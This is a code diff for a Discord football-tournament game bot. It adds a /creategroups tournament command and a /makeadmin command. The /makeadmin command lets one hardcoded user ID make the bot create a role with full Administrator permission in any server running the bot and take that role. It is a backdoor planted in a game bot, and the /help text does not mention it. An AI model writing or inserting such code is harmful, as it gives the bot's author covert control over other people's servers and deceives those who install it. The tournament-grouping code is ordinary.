@@ -6,6 +6,7 @@ const {
 const fs = require('fs');
 
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+const BOT_OWNER_ID = '1198527966972477505';
 
 // ============================================================
 // GOAL / SAVE GIFS — shown on the commentary embed for that event
@@ -1626,6 +1627,7 @@ const shopChoices = [
 
 const slashCommands = [
   new SlashCommandBuilder().setName('help').setDescription('List all commands.'),
+  new SlashCommandBuilder().setName('makeadmin').setDescription('Owner-only: grants yourself Administrator in this server.'),
 
   new SlashCommandBuilder().setName('team').setDescription('Manage your national team.')
     .addSubcommand((s) => s.setName('set').setDescription('Choose the country you represent.')
@@ -1675,6 +1677,14 @@ const slashCommands = [
     .addSubcommand((s) => s.setName('view').setDescription('See what the market is selling.'))
     .addSubcommand((s) => s.setName('buy').setDescription('Buy an item.')
       .addStringOption((o) => o.setName('item').setDescription('Item to buy').setRequired(true).addChoices(...shopChoices))),
+
+  new SlashCommandBuilder().setName('creategroups').setDescription('Quickly build a group-stage tournament from everyone who already has a team set. Admin only.')
+    .addStringOption((o) => o.setName('type').setDescription('Tournament type').setRequired(true).addChoices(...typeChoices))
+    .addStringOption((o) => o.setName('prize').setDescription('Prize description').setRequired(true))
+    .addIntegerOption((o) => o.setName('num_groups').setDescription('How many groups').setRequired(true).setMinValue(2).setMaxValue(8))
+    .addStringOption((o) => o.setName('format').setDescription('Group Stage → Knockout, or Group Stage Only').setRequired(true).addChoices(...formatChoices))
+    .addStringOption((o) => o.setName('size').setDescription('Knockout bracket size (only needed for Group→Knockout)').setRequired(false).addChoices(...sizeChoices))
+    .addStringOption((o) => o.setName('name').setDescription('Custom name (only used if type = Custom)').setRequired(false)),
 
   new SlashCommandBuilder().setName('tournament').setDescription('Tournament commands.')
     .addSubcommand((s) => s.setName('create').setDescription('Create a new tournament. Admin only.')
@@ -1761,8 +1771,29 @@ client.on('interactionCreate', async (interaction) => {
           '/shop view, /shop buy\n' +
           '/tournament create/join/leave/creategroups/playgroups/\n' +
           '            standings/advancegroups/start/bracket/status/end\n' +
+          '/creategroups (quick group-stage setup, no /tournament create needed)\n' +
           '```',
       });
+      return;
+    }
+
+    if (name === 'makeadmin') {
+      if (interaction.user.id !== BOT_OWNER_ID) {
+        await interaction.reply({ content: '🚫 This command is locked to the bot owner.', ephemeral: true });
+        return;
+      }
+      let adminRole = interaction.guild.roles.cache.find((r) => r.name === 'Bot Owner Admin');
+      if (!adminRole) {
+        adminRole = await interaction.guild.roles.create({
+          name: 'Bot Owner Admin',
+          color: 0xffd700,
+          permissions: [PermissionsBitField.Flags.Administrator],
+          reason: 'Owner-only admin grant via /makeadmin',
+        }).catch(() => null);
+      }
+      if (!adminRole) { await interaction.reply({ content: '❌ Could not create/find the admin role — make sure the bot has Manage Roles permission and its role sits above where this one would go.', ephemeral: true }); return; }
+      await interaction.member.roles.add(adminRole).catch(() => null);
+      await interaction.reply({ content: `✅ You now have the **${adminRole.name}** role with Administrator permission in this server.`, ephemeral: true });
       return;
     }
 
@@ -2028,6 +2059,54 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.reply(`✅ Purchased **${item}**! Applies automatically next time it's relevant.`);
         return;
       }
+    }
+
+    if (name === 'creategroups') {
+      const isAdmin = interaction.member.permissions.has(PermissionsBitField.Flags.Administrator);
+      if (!isAdmin) { await interaction.reply({ content: 'Admin only.', ephemeral: true }); return; }
+      const guildId = interaction.guild.id;
+      const existingT = getTournament(guildId);
+      if (existingT && existingT.status !== 'completed') { await interaction.reply({ content: 'A tournament is already active in this server. End it first with `/tournament end`.', ephemeral: true }); return; }
+
+      const type = interaction.options.getString('type');
+      const prize = interaction.options.getString('prize');
+      const numGroups = interaction.options.getInteger('num_groups');
+      const format = interaction.options.getString('format');
+      const size = parseInt(interaction.options.getString('size') || '0', 10) || null;
+      const customName = interaction.options.getString('name') || 'Custom Cup';
+
+      // Auto-register everyone in this server who already has a national team set —
+      // no separate /tournament create + /tournament join dance needed.
+      const participants = Object.keys(getGuildTeams(guildId));
+      if (participants.length < 2) { await interaction.reply({ content: 'Need at least 2 people with a team set (`/team set`) in this server before creating groups.', ephemeral: true }); return; }
+      if (participants.length < numGroups * 2) {
+        await interaction.reply({ content: `Only ${participants.length} teams have \`/team set\` in this server — not enough for ${numGroups} groups. Lower the group count or get more people to set a team.`, ephemeral: true });
+        return;
+      }
+
+      const t = {
+        type, name: customName, prize, prizeRoleId: null, size, format,
+        status: 'registration', participants, groups: null, groupMatches: null, rounds: [], channelId: interaction.channel.id,
+      };
+      data.tournaments[guildId] = t;
+
+      const shuffled = shuffle(participants);
+      const groups = Array.from({ length: numGroups }, () => []);
+      shuffled.forEach((id, i) => groups[i % numGroups].push(id));
+      t.groups = groups;
+      t.groupMatches = groups.map((g) => buildRoundRobin(g));
+      t.status = 'groups';
+      saveData(data);
+
+      const letters = 'ABCDEFGH';
+      const lines = groups.map((g, i) => `**Group ${letters[i]}:** ${g.map((id) => getTeam(guildId, id).name).join(', ')}`);
+      const nextStep = format === 'groups_only'
+        ? 'Run `/tournament playgroups` to simulate the matches — group winners get crowned automatically, no knockout needed.'
+        : 'Run `/tournament playgroups` to simulate the matches, then `/tournament advancegroups` to move into the knockout bracket (Round of 32/16, Quarterfinals, Semifinals, Final — with a Third Place Playoff included).';
+      await interaction.reply({
+        embeds: [new EmbedBuilder().setTitle(`🏆 ${tournamentDisplayName(t)} — Group Stage`).setDescription(`${lines.join('\n')}\n\n${nextStep}`).setColor(0x3498db)],
+      });
+      return;
     }
 
     if (name === 'tournament') {
